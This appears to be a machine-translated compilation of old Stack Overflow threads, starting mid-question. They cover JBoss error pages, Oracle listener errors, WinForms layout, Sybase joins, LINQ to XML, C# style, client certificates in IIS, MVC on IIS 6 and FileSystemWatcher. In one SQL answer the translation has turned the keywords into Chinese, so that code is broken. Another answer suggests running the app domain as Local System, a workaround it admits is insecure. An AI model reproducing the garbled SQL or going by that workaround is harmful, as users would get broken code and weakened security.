并且我已将 400.html 放在我的 war 文件的根目录中（我也尝试将它放在 WEB-INF 的根目录中）。不幸的是，当我应该得到 400 时，我一直得到 404，大概是因为 JBoss 似乎找不到 400.html。任何想法我做错了什么？

可能是因为我的 servlet 映射到根目录？

```
<servlet-mapping>
    <servlet-name>api</servlet-name>
    <url-pattern>/</url-pattern>
</servlet-mapping> 
```

如果是这样，有什么替代方案？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-28T11:56:34.667

为了后代：我终于能够通过将错误重定向到 Spring MVC 具有控制器的页面来实现这一点。控制器刚刚返回了一个空 ModelAndView。因为它是一个 RESTful 服务，所以我真的不需要发出任何 HTML。

# oracle - 重新启动服务器后 ORA-12514

> ID：239934
> 
> 赞同：3
> 
> 时间：2008-10-27T13:49:11.430
> 
> 标签：oracle, ora-12514

我正在使用 Oracle 10g R2。最近，重新启动服务器后，我开始遇到无法连接到实例的问题。我只在服务器本身本地连接。

奇怪的是，如果我启动数据库管理助手并选择我的实例以更改其设置，问题就会自行纠正。

有人知道这个问题的根源吗？

@akaDruid：我只是通过尝试在服务器上启动 SQLPlus 来测试我的连接。

@Matthew：这是 Windows

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-27T14:10:57.360

编辑：我认为我没有正确阅读您的问题：侦听器不应影响本地计算机上的连接，因此您可能会忽略其余的答案，除非它给您提示！你是如何测试你的连接的？ORA-12514 是唯一的错误吗？

* * *

（我假设您在这里使用 Windows）我猜当您重新启动服务器时侦听器不会自动启动，并且它正在 oracle 管理助手中启动 - 不幸的是，我没有使用该工具，所以不能说。

下次重新启动时，在启动 oracle 管理助手之前，打开命令提示符并键入 lsnrctl status。如果侦听器尚未启动，您将得到如下信息：

```
C:\Documents and Settings\user>lsnrctl status

LSNRCTL for 32-bit Windows: Version 10.2.0.1.0 - Production on 27-OCT-2008 14:00:21

Copyright (c) 1991, 2005, Oracle.  All rights reserved.

Connecting to (DESCRIPTION=(ADDRESS=(PROTOCOL=IPC)(KEY=EXTPROC01)))
TNS-12541: TNS:no listener
 TNS-12560: TNS:protocol adapter error
  TNS-00511: No listener
   32-bit Windows Error: 2: No such file or directory
Connecting to (DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=server.domain.co.uk)
(PORT=1521)))
TNS-12541: TNS:no listener
 TNS-12560: TNS:protocol adapter error
  TNS-00511: No listener
   32-bit Windows Error: 61: Unknown error

C:\Documents and Settings\user>lsnrctl status 
```

如果它正在运行，你会得到这样的东西：

```
LSNRCTL for 32-bit Windows: Version 10.2.0.1.0 - Production on 27-OCT-2008 14:03
:33

Copyright (c) 1991, 2005, Oracle.  All rights reserved.

Connecting to (DESCRIPTION=(ADDRESS=(PROTOCOL=IPC)(KEY=EXTPROC01)))
STATUS of the LISTENER
------------------------
Alias                     LISTENER
Version                   TNSLSNR for 32-bit Windows: Version 10.2.0.1.0 - Production
Start Date                27-OCT-2008 14:03:27
Uptime                    0 days 0 hr. 0 min. 5 sec
Trace Level               off
Security                  ON: Local OS Authentication
SNMP                      OFF
Listener Parameter File   C:\oracle\product\10.2.0\db_1\network\admin\listener.ora
Listener Log File         C:\oracle\product\10.2.0\db_1\network\log\listener.log

Listening Endpoints Summary...
  (DESCRIPTION=(ADDRESS=(PROTOCOL=ipc)(PIPENAME=\\.\pipe\EXTPROC01ipc)))
  (DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=server.domain.co.uk)(PORT=1521))
)
Services Summary...
Service "ORCL" has 1 instance(s).
  Instance "ORCL", status UNKNOWN, has 1 handler(s) for this service...
Service "ORCL1" has 1 instance(s).
  Instance "ORCL1", status UNKNOWN, has 1 handler(s) for this service...
Service "PLSExtProc" has 1 instance(s).
  Instance "PLSExtProc", status UNKNOWN, has 1 handler(s) for this service...
The command completed successfully

C:\Documents and Settings\user> 
```

如果侦听器未启动，请检查服务是否设置为自动。如果是，请检查 listener.ora 是否有意义，查看从 lsnrctl start 获得的输出等。

希望有帮助，或者至少让你走上正确的道路

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-28T00:24:48.807

您还没有指定这是 windows 还是 unix？

当 ORACLE_HOME 在启动 oracle 的帐户上的定义略有不同时，我在 unix 上看到过类似的问题，并且在连接帐户时，一个帐户具有 ORACLE_HOME=/usr/oracle ，另一个具有 ORACLE_HOME=/usr/oracle/ ，尾随斜线把事情搞砸了。

你究竟是如何启动服务器的，你有一个脚本来做，或者你是在内部连接并发出“启动”

再说一次，如果这是 Windows，我不知道 :)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-05-27T15:32:50.607

我有同样的错误。转到[http://localhost:1158/em](http://localhost:1158/em)显示侦听器已启动，但数据库实例已关闭。

单击实例旁边的“启动”按钮使其重新联机（我认为）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2011-05-31T09:23:48.110

另一种可能的解释：

[http://www.orafaq.com/forum/t/66224/2/](http://www.orafaq.com/forum/t/66224/2/)

# .net - WinForms：更改 TableLayoutPanel 中行数的正确方法

> ID：239938
> 
> 赞同：2
> 
> 时间：2008-10-27T13:50:46.607
> 
> 标签：.net, winforms, desktop-application

我正在尝试以编程方式更改[TableLayoutPanel](http://msdn.microsoft.com/en-us/library/system.windows.forms.tablelayoutpanel.aspx)中的行数（有时需要为四，有时为五，很少为六）。

不幸的是，更改行数不会使[`RowStyles`](http://msdn.microsoft.com/en-us/library/system.windows.forms.tablelayoutpanel.rowstyles.aspx)集合保持同步，因此您无法设置新添加行的高度。以下测试代码证明了这一事实：

```
private void button1_Click(object sender, EventArgs e)
{
    //TableLayoutPanels start with 2 rows by default.
    Debug.Assert(tableLayoutPanel1.RowStyles.Count == 
            tableLayoutPanel1.RowCount);

    //Cannot remove rows
    tableLayoutPanel1.RowCount = 1;
    Debug.Assert(tableLayoutPanel1.RowStyles.Count == 
            tableLayoutPanel1.RowCount);

} 
```

第二个断言失败。

```
private void button2_Click(object sender, EventArgs e)
{
    //TableLayoutPanels start with 2 rows by default.
    Debug.Assert(tableLayoutPanel1.RowStyles.Count == 
            tableLayoutPanel1.RowCount);

    //Cannot add rows
    tableLayoutPanel1.RowCount = 6;
    Debug.Assert(tableLayoutPanel1.RowStyles.Count == 
            tableLayoutPanel1.RowCount);
} 
```

第二个断言失败。

那么设置[`RowCount`](http://msdn.microsoft.com/en-us/library/system.windows.forms.tablelayoutpanel.rowcount.aspx)a 属性的正确编程方式是[`TableLayoutPanel`](http://msdn.microsoft.com/en-us/library/system.windows.forms.tablelayoutpanel.aspx)什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-27T14:49:57.830

这个问题在 2005 年被报告给微软，他们承认这是一个错误~~，但他们“*仍在评估我们的选项*”~~微软决定不修复它（“关闭”）。

**[TableLayoutPanel Rows 和 RowStyles 不对应。](http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=122017)**

**描述**

> 当您创建 tableLayoutPanel 并创建新行时（通过在程序中添加行或设置 RowCount 属性），新的 RowStyles 不会添加到控件中。此外，如果我添加新的行样式，行数会增加，但不会增加到相同的数量：如果我从两个行和两个行样式开始，将行数设置为 4，然后添加两个行样式（在设计视图中）， Rowcount 已设置为 6。RowStyles 集合的序数与当前 RowCount 匹配似乎更直观。

## 注释

Microsoft 于 2005 年 10 月 24 日下午 6:07 发布

> 当我们开始计划下一个版本的 Visual Studio 时，此问题已被重新激活。在接下来的几个月里，我们将重新考虑之前被推迟的反馈。我们欢迎您的意见和参与这个过程。

Microsoft 于 2005 年 6 月 27 日上午 6:49 发布

> Microsoft 子状态现在是“复制”
> 
> 感谢您报告此错误，我们已经能够重现此问题并正在调查。
> 
> 谢谢你，Prabhu，VS2005 产品团队。

Microsoft 于 2005 年 6 月 27 日下午 5:55 发布

> 感谢您报告此问题。这是我们的运行时对象模型中的一个特性，它不能很好地转化为设计时。在运行时，RowCount 和 ColCount 在自动增长方面实际上意味着 minRowCount 和 minColCount，因为行/列不需要支持样式。在设计时，我们尝试简化它并在样式和行/列之间保持接近 1:1 的对应关系。在这种情况下，您看到的是设计运行时行为。我们已经有一个跟踪此问题的错误，并且仍在评估我们的选项。再次感谢您为更好的 Whidbey 做出贡献。

Microsoft 于 2005 年 7 月 6 日下午 3:43 发布

> 感谢您报告此问题。这是我们在设计时选择不解决的运行时对象模型中的一个特性。在运行时，RowCount 和 ColCount 在自动增长方面实际上意味着 minRowCount 和 minColCount，因为行/列不需要支持样式。在设计时，我们通常会尝试简化它并在样式和行/列之间保持接近 1:1 的对应关系。在带有自动增长的表格布局面板上的 rowSpan 或 colSpan 的情况下，您可能会进入行/行数/行样式不同步的状态。为避免这种情况，只需先添加您需要的列/行，然后设置控件的 *span 属性。谢谢。

Microsoft 于 2005 年 10 月 24 日下午 6:07 发布

> 当我们开始计划下一个版本的 Visual Studio 时，此问题已被重新激活。在接下来的几个月里，我们将重新考虑之前被推迟的反馈。我们欢迎您的意见和参与这个过程。
> 
> -- Visual Studio 团队

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T14:10:55.863

您是否尝试过创建一个新的`RowStyle`然后使用该`tableLayoutPanel1.RowStyles.Add`方法添加它？

# sql - 需要在只返回一行的外连接中创建表达式

> ID：239945
> 
> 赞同：4
> 
> 时间：2008-10-27T13:52:03.047
> 
> 标签：sql, correlated-subquery

我正在创建一个非常复杂的动态 sql，它必须为每个用户返回一行，但现在我必须加入一对多表。我做了一个外连接以确保我至少得到一行（并且可以检查 null 以查看该表中是否有数据）但我必须确保我只从这个外连接部分返回一行，如果有多个此用户的第二个表中的行。到目前为止，我想出了这个：（sybase）

```
SELECT a.user_id
FROM table1 a
    ,table2 b
WHERE a.user_id = b.user_id
AND a.sub_id = (
    SELECT min(c.sub_id)
    FROM table2 c
    WHERE b.sub_id = c.sub_id
    ) 
```

子查询在一对多表中为该特定用户找到最小值。

这行得通，但是当表 1 和表 2 变得非常大时，我担心执行相关子查询会带来麻烦。有没有更好的办法？我正在努力想出一种方法来让加入来做到这一点，但我没有看到它。还说“where rowcount=1”或“top 1”对我没有帮助，因为我不是要修复上面的查询，而是将上面的内容添加到已经很复杂的查询中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-27T14:37:29.103

在 MySql 中，您可以确保任何查询最多返回 X 行使用

```
select *
from foo
where bar = 1
limit X; 
```

不幸的是，我相当肯定这是一个 MySQL 特定的 SQL 扩展。但是，Google 搜索“mysql sybase limit”之类的内容可能会找到 Sybase 的等价物。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T15:11:37.677

A few quick points:

1.  You need to have definitive business rules. If the query returns more than one row then you need to think about why (beyond just "it's a 1:many relationship - WHY is it a 1:many relationship?). You should come up with the business solution rather than just use "min" because it gives you 1 row. The business solution might simply be "take the first one", in which case min might be the answer, but you need to make sure that's a conscious decision.
2.  You should really try to use the ANSI syntax for joins. Not just because it's standard, but because the syntax that you have isn't really doing what you think it's doing (it's not an outer join) and some things are simply impossible to do with the syntax that you have.

Assuming that you end up using the MIN solution, here's one possible solution without the subquery. You should test it with various other solutions to make sure that they are equivalent in outcome and to see which performs the best.

```
SELECT
     a.user_id, b.*
FROM
     dbo.Table_1 a
LEFT OUTER JOIN dbo.Table_2 b ON b.user_id = a.user_id AND b.sub_id = a.sub_id
LEFT OUTER JOIN dbo.Table_2 c ON c.user_id = a.user_id AND c.sub_id < b.sub_id
WHERE
     c.user_id IS NULL 
```

You'll need to test this to see if it's really giving what you want and you might need to tweak it, but the basic idea is to use the second LEFT OUTER JOIN to ensure that there are no rows that exist with a lower sub_id than the one found in the first LEFT OUTER JOIN (if any is found). You can adjust the criteria in the second LEFT OUTER JOIN depending on the final business rules.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-27T13:55:53.930

也许你的例子太简单了，但我会使用一个组：

```
选择
  a.user_id
从
  表1a
    LEFT OUTER JOIN table2 b ON (a.user_id = b.user_id)
通过...分组
  a.user_id

```

我担心唯一的其他方法是使用嵌套查询：

此查询与您的示例之间的区别是“子表”只生成一次，但是在您的示例中，您为 table1 中的每一行生成一个“子表”（但可能取决于编译器，因此您可能希望使用查询分析仪检查性能）。

```
选择
  a.user_id,
  b.sub_id
从
  表1a
    左外连接 (
      选择
        用户身份，
        min(sub_id) 作为 sub_id，
      从
        表2
      通过...分组
        用户身份
    ) b 开启 (a.user_id = b.user_id)

```

此外，如果您的查询变得非常复杂，我会使用临时表来简化代码，这可能会花费更多的处理时间，但会使您的查询更易于维护。

临时表示例是：

```
选择
  用户身份
进入
  ＃表格1
从
  表格1
在哪里
  ......

选择
  a.user_id,
  min(b.sub_id) 作为 sub_id，
进入
  #table2
从
  #table1 一个
    INNER JOIN table2 b ON (a.user_id = b.user_id)
通过...分组
  a.user_id

选择
  一个。*，
  b.sub_id
从
  #table1 一个
    左外连接 #table2 b ON (a.user_id = b.user_id)

```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T14:21:11.147

怎么样：

```
select a.user_id 
from table1 a
where exists (select null from table2 b 
              where a.user_id = b.user_id 
             ) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T14:51:34.813

首先，我相信您尝试编写的查询作为您的示例是：

```
select a.user_id 
from table1 a, table2 b 
where a.user_id = b.user_id 
and b.sub_id = (select min(c.sub_id) 
                from table2 c 
                where b.user_id = c.user_id) 
```

除了你想要一个外连接（我认为有人编辑了 Oracle 语法）。

```
select a.user_id 
from table1 a
left outer join table2 b on a.user_id = b.user_id 
where b.sub_id = (select min(c.sub_id) 
                from table2 c 
                where b.user_id = c.user_id) 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-10-27T15:16:10.053

Well, you already have a query that works. If you are concerned about the speed you could

*   Add a field to table2 which identifies which sub_id is the 'first one' or

*   Keep track of table2's primary key in table1, or in another table

# c# - 如何确定 XElement.Elements() 是否包含具有特定名称的节点？

> ID：239951
> 
> 赞同：29
> 
> 时间：2008-10-27T13:54:22.573
> 
> 标签：c#, xml, linq, .net-3.5

例如对于以下 XML

```
 <Order>
  <Phone>1254</Phone>
  <City>City1</City>
  <State>State</State>
 </Order> 
```

我可能想知道 XElement 是否包含“City”节点。

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2008-10-27T13:57:55.377

只需对[Elements](http://msdn.microsoft.com/en-us/library/bb348975.aspx)使用其他重载。

```
bool hasCity = OrderXml.Elements("City").Any(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T13:59:18.430

自从我做 Xlinq 以来已经有一段时间了，但这是我的 WAG：

```
from x in XDocument
where x.Elements("City").Count > 0
select x 
```

;

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-06-21T03:52:29.777

David's 是最好的，但如果您需要一些自定义逻辑，您可以编写自己的谓词`OrderXML.Elements("City").Exists(x=>x.Name =="City")`

# c# - 推荐：“静态公共”或“公共静态”

> ID：239961
> 
> 赞同：43
> 
> 时间：2008-10-27T13:57:30.570
> 
> 标签：c#

如果你有一个班级成员是`static`and `public`。你会写`static public`还是`public static`？我知道他们是一样的。但是有一些建议/最佳实践来写这个吗？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2008-10-27T13:59:13.923

“公共静态”更为常见，因此您可能希望使用它只是为了增加从未偶然发现“静态公共”的程序员的可读性。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2008-10-27T14:00:36.633

看到[这个问题](https://stackoverflow.com/questions/191929/is-there-a-convention-to-the-order-of-modifiers-in-c#191944)

如果您下载 Microsoft [StyleCop](http://code.msdn.microsoft.com/sourceanalysis) Visual Studio 插件，它可以根据 Microsoft 使用的规则验证您的源代码。它喜欢访问修饰符排在第一位。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2008-10-27T14:03:14.880

当其他都不重要时，保持一致。在这种情况下，世界其他地方都使用`public static`，所以我也会这样做，以避免那些阅读您的代码的人感到不必要的意外。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-10-27T13:58:55.827

我个人会选择公共静态，因为它是公共的比它是静态的更重要。

并检查：[http ://checkstyle.sourceforge.net/config_modifier.html](http://checkstyle.sourceforge.net/config_modifier.html)

还有这个： http: [//java.sun.com/docs/books/jls/second_edition/html/classes.doc.html](http://java.sun.com/docs/books/jls/second_edition/html/classes.doc.html)（这两个链接是针对Java的，但是概念是一样的）

短版：推荐使用“public static”，而且更为常见。

# c# - 传递客户端证书仅适用于我的机器

> ID：239979
> 
> 赞同：2
> 
> 时间：2008-10-27T14:03:33.570
> 
> 标签：c#, web-services, security, client-certificates

我有一个 Web 服务，它通过要求消费的第三方应用程序通过客户端证书来保护。我已经在生产环境和客户端上安装了证书。此过程目前适用于具有类似设置的其他客户端。当前版本是用 .NET 3.5 编写的，可以在我的 cassini 下的开发机器上完美运行（并且独立运行），但拒绝在我的生产机器上使用相同的代码和证书设置。我已确认提供者 Web 服务通过浏览器接受安装在客户端上的证书，但是当以编程方式将证书添加到 Web 服务调用时，我得到 403，访问被拒绝。在向受保护的 Web 服务发出请求之前，我输出添加到调用中的证书的指纹，它确实是附加的正确证书。我的想法是，在某个地方，它无法访问证书的私钥部分。

有任何想法吗？

注意：我已授予 IIS 进程对相关 ~/crypto 目录的访问权限。

这是 C# 和 .NET 3.5

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T14:06:43.923

几周前我遇到了这种问题。就我而言，解决方案是使用模拟来获得对证书存储的适当访问权限。默认情况下，IIS 工作线程以系统用户身份运行，因此无法访问相应的存储。将证书添加到特定用户存储，并模拟该用户解决了所有问题。

不过，我将继续关注这个问题，因为我知道冒充不是灵丹妙药，并且在这种情况下会出现问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-29T00:28:20.953

它在我的机器上不起作用是有一个明显的原因。在 Visual Studio 中运行时，它使用我用于安装证书的凭据运行。因此自动拥有访问机器上私钥存储的权限。 *但是*，在 cassini 之外（在 IDE 中）运行时，IIS 进程没有访问私钥存储的**权限。**

临时解决方案：将 app-domain 作为**Local System**运行。不利于安全，但它可以让应用程序启动并运行（尽管是创可贴的），直到我能找到一个更持久的解决方案。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2008-10-27T14:43:59.557

你可以在你的程序上贴上这个标签然后收工：

![替代文字](https://i.stack.imgur.com/AZidp.png)

# asp.net-mvc - 将 asp.net mvc beta 部署到 iis 6 导致 404

> ID：239981
> 
> 赞同：14
> 
> 时间：2008-10-27T14:04:01.667
> 
> 标签：asp.net-mvc, iis-6, http-status-code-404

在 IIS 6 上部署时，我正在努力解决来自 asp.net mvc beta 的 404 错误。我通过在 IIS 中映射 .mvc 在其中一个预览版中工作，但这不再有效。我已经阅读了[Omar 的帖子](http://msmvps.com/blogs/omar/archive/2008/06/30/deploy-asp-net-mvc-on-iis-6-solve-404-compression-and-performance-problems.aspx)和网络上的其他几个帖子，并尝试了他们的解决方案，但到目前为止还没有运气。

主页在 IIS 6 上打开没有问题，但其他 404 并且该站点在 IIS 7 上运行良好。

有没有人成功地将 asp.net mvc beta 部署到 IIS 6？如果是这样，您需要对代码和/或 IIS 设置进行哪些调整才能使其正常工作？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2008-10-27T15:36:35.690

我从[Steve Sanderson 的博客](http://blog.codeville.net/2008/07/04/options-for-deploying-aspnet-mvc-to-iis-6/)中找到了解决问题的方法（感谢 Steve）：

使用通配符映射`aspnet_isapi.dll`. 这告诉 IIS 6 使用 ASP.NET 处理所有请求，因此始终调用路由，并且没有问题。设置起来很容易：

*   打开 IIS 管理器（运行 -> inetmgr -> 确定）
*   右键单击您的应用程序，转到属性
*   然后主目录选项卡，然后单击配置。
*   在通配符应用程序映射下，单击插入（不是添加，这在上面令人困惑）
*   然后在“可执行文件”中输入 C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\aspnet_isapi.dll，并取消选中验证文件是否存在。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2011-01-04T15:07:02.060

我似乎还不能写评论。所以我会写一个新的答案。

在 stackoverflow 上有一些类似的问题。我正在使用 MVC 3。我知道这个问题与 MVC 2 相关。但由于这是我遇到的第一个 stackoverflow 帖子，我认为值得一提的是：

*   使用 MVC 3 时，需要添加新的扩展映射与 .NET 4 框架的可执行文件（C:\WINDOWS\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll）

<edit>我刚刚发现我什至不需要设置扩展映射。</编辑>

*   那时它仍然对我不起作用 :) 我仍然必须在 IIS 的 Web 服务扩展部分中“允许”ASP.NET v4.0.30319：
    *   打开 IIS
    *   单击服务器节点
    *   打开 Web 服务扩展部分
    *   选择 ASP.NET v4.0....
    *   右键单击-> 允许好去！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-11-24T06:22:24.487

网址重写可以帮助您解决问题。我已经实现了允许在任何 IIS 版本上部署 MVC 应用程序的解决方案，即使使用虚拟主机也是如此。 [http://www.codeproject.com/KB/aspnet/iis-aspnet-url-rewriting.aspx](http://www.codeproject.com/KB/aspnet/iis-aspnet-url-rewriting.aspx)

# c# - FileSystemWatcher 与轮询以监视文件更改

> ID：239988
> 
> 赞同：163
> 
> 时间：2008-10-27T14:05:38.323
> 
> 标签：c#, file-io, filesystemwatcher, distributed-filesystem

我需要设置一个应用程序来监视在本地或网络驱动器上的目录中创建的文件。

或轮询`FileSystemWatcher`计时器将是最好的选择。我过去使用过这两种方法，但没有广泛使用。

这两种方法都有哪些问题（性能、可靠性等）？

* * *

## 回答 #1

> 赞同：112
> 
> 时间：2008-10-27T14:12:51.540

我已经看到文件系统观察程序在生产和测试环境中失败。我现在认为它很方便，但我认为它不可靠。我的模式一直是使用文件系统观察程序来观察更改，但偶尔轮询以捕获丢失的文件更改。

编辑：如果您有 UI，您还可以让您的用户能够“刷新”更改而不是轮询。我会将它与文件系统观察程序结合起来。

* * *

## 回答 #2

> 赞同：61
> 
> 时间：2009-06-05T15:29:51.433

我遇到的最大问题是缓冲区满时文件丢失。像馅饼一样容易修复 - 只需增加缓冲区。请记住，它包含文件名和事件，因此将其增加到预期的文件数量（试错）。它确实使用无法分页的内存，因此如果内存不足，它可能会强制其他进程进行分页。

这是关于缓冲区的 MSDN 文章： [FileSystemWatcher..::.InternalBufferSize Property](http://msdn.microsoft.com/en-us/library/system.io.filesystemwatcher.internalbuffersize.aspx)

根据 MSDN：

> 增加缓冲区大小是昂贵的，因为它来自无法换出到磁盘的非分页内存，因此请保持缓冲区尽可能小。为避免缓冲区溢出，请使用 NotifyFilter 和 IncludeSubdirectories 属性过滤掉不需要的更改通知。

我们使用 16MB，因为一次预计会有大批量。工作正常，从不错过文件。

我们还在开始处理甚至一个文件之前读取了所有文件……将文件名安全地缓存起来（在我们的例子中，缓存到数据库表中）然后处理它们。

对于文件锁定问题，我生成了一个进程，该进程等待文件被解锁等待一秒钟，然后是两秒钟，然后是四秒钟，等等。我们**从不**投票。这已经在生产中没有错误大约两年。

* * *

## 回答 #3

> 赞同：35
> 
> 时间：2008-10-27T14:23:41.690

如果排队更改的`FileSystemWatcher`数量溢出提供的缓冲区，则在繁忙时间也可能会丢失更改。这不是 .NET 类本身的限制，而是底层 Win32 基础结构的限制。根据我们的经验，最小化此问题的最佳方法是尽快将通知出列并在另一个线程上处理它们。

正如上面@ChillTemp 所提到的，观察者可能无法在非 Windows 共享上工作。例如，它在安装的 Novell 驱动器上根本不起作用。

我同意一个很好的折衷办法是不定期地进行一次民意调查以找出任何错过的更改。

* * *

## 回答 #4

> 赞同：18
> 
> 时间：2008-10-27T14:17:33.790

另请注意，文件系统观察程序在文件共享上不可靠。特别是如果文件共享托管在非 Windows 服务器上。FSW 不应该用于任何关键的事情。或者应该与偶尔的民意调查一起使用，以验证它没有遗漏任何东西。

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2008-10-27T14:32:53.650

就个人而言，我在`FileSystemWatcher`生产系统上使用过，它运行良好。在过去的 6 个月中，它没有出现过 24x7 全天候运行的问题。它正在监视单个本地文件夹（共享）。我们必须处理的文件操作数量相对较少（每天触发 10 个事件）。这不是我曾经担心过的事情。如果我不得不重新做出决定，我会再次使用它。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-10-27T14:33:24.587

我目前使用`FileSystemWatcher`平均每 100 毫秒更新一次的 XML 文件。

我发现只要`FileSystemWatcher`配置正确，*本地*文件就不会出现问题。

我没有远程文件观看和非 Windows 共享的经验。

我会考虑轮询文件是多余的，不值得开销，除非你天生不信任`FileSystemWatcher`或直接经历过这里其他人列出的限制（非 Windows 共享和远程文件监视）。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2008-10-27T14:24:53.497

`FileSystemWatcher`我在使用网络共享时遇到了麻烦。如果您在纯 Windows 环境中，这可能不是问题，但我正在观看 NFS 共享，并且由于 NFS 是无状态的，因此当我正在观看的文件发生更改时，从来没有通知。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2008-10-27T14:29:08.807

我会去投票。

网络问题导致`FileSystemWatcher`不可靠（即使在错误事件超载时）。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-10-27T14:35:22.057

我在网络驱动器上使用 FSW 时遇到了一些大问题：删除文件总是抛出错误事件，而不是删除事件。我没有找到解决方案，所以我现在避免使用 FSW 并使用轮询。

另一方面，创建事件运行良好，因此如果您只需要注意文件创建，则可以使用 FSW。

此外，无论是否共享，我在本地文件夹上都没有问题。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2018-08-10T15:00:37.820

尽快从事件方法返回，使用另一个线程，为我解决了这个问题：

```
private void Watcher_Created(object sender, FileSystemEventArgs e)
{
    Task.Run(() => MySubmit(e.FullPath));
} 
```

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2013-10-20T18:08:16.297

在我看来，同时使用 FSW*和*轮询是浪费时间和资源，我很惊讶有经验的开发人员建议这样做。如果您需要使用轮询来检查任何“FSW 未命中”，那么您自然可以完全丢弃 FSW 并仅使用轮询。

目前，我正在尝试决定是否将使用 FSW*或*轮询来开发我开发的项目。阅读答案，很明显在某些情况下 FSW 可以完美地满足需求，而其他时候则*需要*轮询。不幸的是，*没有答案*实际上处理了*性能*差异（如果有的话），只有“可靠性”问题。有没有人可以回答这部分问题？

**编辑： nmclean**关于同时使用 FSW 和轮询的有效性的观点（如果您有兴趣，可以阅读评论中的讨论）似乎是一个非常合理的解释，为什么会出现同时使用 FSW 和轮询*的情况*高效的。感谢您为我（以及其他任何有相同观点的人）阐明这一点，**nmclean**。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-02-15T18:41:55.033

**使用创建事件而不是更改的工作解决方案**

即使是复制、剪切、粘贴、移动。

```
class Program
{        

        static void Main(string[] args)
        {
            string SourceFolderPath = "D:\\SourcePath";
            string DestinationFolderPath = "D:\\DestinationPath";
            FileSystemWatcher FileSystemWatcher = new FileSystemWatcher();
            FileSystemWatcher.Path = SourceFolderPath;
            FileSystemWatcher.IncludeSubdirectories = false;
            FileSystemWatcher.NotifyFilter = NotifyFilters.FileName;   // ON FILE NAME FILTER       
            FileSystemWatcher.Filter = "*.txt";         
             FileSystemWatcher.Created +=FileSystemWatcher_Created; // TRIGGERED ONLY FOR FILE GOT CREATED  BY COPY, CUT PASTE, MOVE  
            FileSystemWatcher.EnableRaisingEvents = true;

            Console.Read();
        }     

        static void FileSystemWatcher_Created(object sender, FileSystemEventArgs e)
        {           
                string SourceFolderPath = "D:\\SourcePath";
                string DestinationFolderPath = "D:\\DestinationPath";

                try
                {
                    // DO SOMETING LIKE MOVE, COPY, ETC
                    File.Copy(e.FullPath, DestinationFolderPath + @"\" + e.Name);
                }
                catch
                {
                }          
        }
} 
```

**使用静态存储的文件属性更改事件时此文件监视器的解决方案**

```
class Program
{
    static string IsSameFile = string.Empty;  // USE STATIC FOR TRACKING

    static void Main(string[] args)
    {
         string SourceFolderPath = "D:\\SourcePath";
        string DestinationFolderPath = "D:\\DestinationPath";
        FileSystemWatcher FileSystemWatcher = new FileSystemWatcher();
        FileSystemWatcher.Path = SourceFolderPath;
        FileSystemWatcher.IncludeSubdirectories = false;
        FileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;          
        FileSystemWatcher.Filter = "*.txt";         
        FileSystemWatcher.Changed += FileSystemWatcher_Changed;
        FileSystemWatcher.EnableRaisingEvents = true;

        Console.Read();
    }     

    static void FileSystemWatcher_Changed(object sender, FileSystemEventArgs e)
    {
        if (e.Name == IsSameFile)  //SKIPS ON MULTIPLE TRIGGERS
        {
            return;
        }
        else
        {
            string SourceFolderPath = "D:\\SourcePath";
            string DestinationFolderPath = "D:\\DestinationPath";

            try
            {
                // DO SOMETING LIKE MOVE, COPY, ETC
                File.Copy(e.FullPath, DestinationFolderPath + @"\" + e.Name);
            }
            catch
            {
            }
        }
        IsSameFile = e.Name;
    }
} 
```

这是针对多触发事件这一问题的变通解决方案。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2014-07-03T09:19:05.663

我会说使用轮询，尤其是在 TDD 场景中，因为在触发轮询事件时模拟/存根文件的存在或其他情况比依赖更“不受控制”的 fsw 事件要容易得多。+ 在许多受 fsw 错误困扰的应用程序上工作过。*********